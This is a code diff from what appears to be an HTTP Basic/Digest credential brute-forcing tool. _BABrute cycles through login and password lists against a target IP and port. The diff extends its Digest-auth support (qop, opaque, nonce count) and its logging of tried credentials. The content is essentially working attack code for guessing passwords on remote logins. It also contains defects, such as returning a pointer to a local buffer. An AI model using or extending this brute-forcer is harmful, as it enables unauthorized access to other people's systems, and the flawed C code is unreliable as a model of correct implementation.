@@ -302,28 +302,48 @@ char *_getAttributeValue(char *str, char *val, char *ip, int port)
 		return "";
 	};
 };
-void print_md5_sum(unsigned char* md, char* md5) 
-{
-	char temp[8] = {0};
-	for(int i = 0; i < MD5_DIGEST_LENGTH; ++i) 
-	{
-		ZeroMemory(temp, 8);
-		sprintf(temp, "%02x", md[i]);
 
-		if(i != 0)
-		{
-			strcat(md5, temp);
-		}
-		else
-		{
-			strcpy(md5, temp);
-		};
-	};
-};
-char *_makeDigestResponse(char *login, char *realm, char *pass, char *path, char *nonce)
+#define HASHLEN 16
+typedef char HASH[HASHLEN];
+#define HASHHEXLEN 32
+typedef char HASHHEX[HASHHEXLEN+1];
+#define IN
+#define OUT
+void CvtHex(
+    IN HASH Bin,
+    OUT HASHHEX Hex
+    )
 {
-	unsigned char HA1[MD5_DIGEST_LENGTH];
-	unsigned char HA2[MD5_DIGEST_LENGTH];
+    unsigned short i;
+    unsigned char j;
+
+    for (i = 0; i < HASHLEN; i++) {
+        j = (Bin[i] >> 4) & 0xf;
+        if (j <= 9)
+            Hex[i*2] = (j + '0');
+         else
+            Hex[i*2] = (j + 'a' - 10);
+        j = Bin[i] & 0xf;
+        if (j <= 9)
+            Hex[i*2+1] = (j + '0');
+         else
+            Hex[i*2+1] = (j + 'a' - 10);
+    };
+    Hex[HASHHEXLEN] = '\0';
+};
+char *_makeDigestResponse(
+	char *login, 
+	char *realm, 
+	char *pass, 
+	char *path, 
+	char *nonce,
+	char *pszNonceCount,
+	char *pszCNonce,
+	char *pszQop
+	)
+{
+	char HA1[MD5_DIGEST_LENGTH];
+	char HA2[MD5_DIGEST_LENGTH];
 	char HA1Data[512] = {0};
 	char HA2Data[512] = {0};
 
@@ -336,8 +356,8 @@ char *_makeDigestResponse(char *login, char *realm, char *pass, char *path, char
 	strcpy(HA2Data, "GET:");
 	strcat(HA2Data, path);
 
-	MD5((unsigned char*) HA1Data, strlen(HA1Data), HA1);
-	MD5((unsigned char*) HA2Data, strlen(HA2Data), HA2);
+	MD5((unsigned char*) HA1Data, strlen(HA1Data), (unsigned char*)HA1);
+	MD5((unsigned char*) HA2Data, strlen(HA2Data), (unsigned char*)HA2);
 
 	char responseData[512] = {0};
 	char *HA1MD5 = new char[64];
@@ -345,20 +365,28 @@ char *_makeDigestResponse(char *login, char *realm, char *pass, char *path, char
 	ZeroMemory(HA1MD5, 64);
 	ZeroMemory(HA2MD5, 64);
 
-	print_md5_sum(HA1, HA1MD5);
+	CvtHex(HA1, HA1MD5);
 	strcpy(responseData, HA1MD5);
 	strcat(responseData, ":");
 	strcat(responseData, nonce);
-	strcat(responseData, "::auth:");
-	print_md5_sum(HA2, HA2MD5);
+	strcat(responseData, ":");
+	if (*pszQop != NULL) {
+		strcat(responseData, pszNonceCount);
+		strcat(responseData, ":");
+		strcat(responseData, pszCNonce);
+		strcat(responseData, ":");
+		strcat(responseData, pszQop);
+		strcat(responseData, ":");
+      };
+	CvtHex(HA2, HA2MD5);
 	strcat(responseData, HA2MD5);
 	delete []HA1MD5;
 	delete []HA2MD5;
 
-	unsigned char response[MD5_DIGEST_LENGTH];
-	MD5((unsigned char*) responseData, strlen(responseData), response);
+	char response[MD5_DIGEST_LENGTH];
+	MD5((unsigned char*) responseData, strlen(responseData), (unsigned char*)response);
 	char responseMD5[64] = {0};
-	print_md5_sum(response, responseMD5);
+	CvtHex(response, responseMD5);
 	return (char*)responseMD5;
 };
 volatile bool baSSLLocked = false;
@@ -527,6 +555,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	char attribute[2048] = {0};
 	char nonce[512] = {0};
 	char realm[512] = {0};
+	char opaque[512] = {0};
+	char qop[64] = {0};
 	string encoded = "";
 	for(int i = 0; i < MaxLogin; i++)
 	{
@@ -550,6 +580,11 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcpy(nonce, _getAttributeValue(attribute, "nonce=", ip, port));
 				ZeroMemory(realm, 512);
 				strcpy(realm, _getAttributeValue(attribute, "realm=", ip, port));
+				ZeroMemory(qop, 64);
+				if(strstri(attribute, "qop") != NULL)
+				{
+					strcpy(qop, _getAttributeValue(attribute, "qop=", ip, port));
+				};
 
 				strcpy(request, "GET ");
 				strcat(request, path);
@@ -569,8 +604,17 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcat(request, "\", uri=\"");
 				strcat(request, path);
 				strcat(request, "\", qop=auth, response=\"");
-				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce));
-				strcat(request, "\", nc=00000001, cnonce=\"9d531d56796e0dc9\"\r\nConnection: close\r\nContent-length: 0\r\n\r\n");
+				strcat(request, _makeDigestResponse(curLogin, realm, curPass, path, nonce, "10000001", "9d531d56796e0dc9", qop));
+				if(strstri(attribute, "opaque") != NULL)
+				{
+					ZeroMemory(opaque, 512);
+					strcpy(opaque, _getAttributeValue(attribute, "opaque=", ip, port));
+					strcat(request, "\", opaque=\"");
+					strcat(request, opaque);
+				};
+				//strcat(request, "\"");
+				strcat(request, "\", nc=10000001, cnonce=\"9d531d56796e0dc9\"");
+				strcat(request, "\r\nConnection: close\r\nContent-length: 0\r\n\r\n");
 			}
 			else
 			{
@@ -643,7 +687,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 							strncat(recvBuff, recvBuff2, x);
 						};
-						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(tPass) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
+						if(BALogSwitched) stt->doEmitionBAData("Checked BA: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(curLogin) + ":" + QString(curPass) + ";	- Progress: (" + QString::number((passCounter++/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
 					}
 					else
 					{
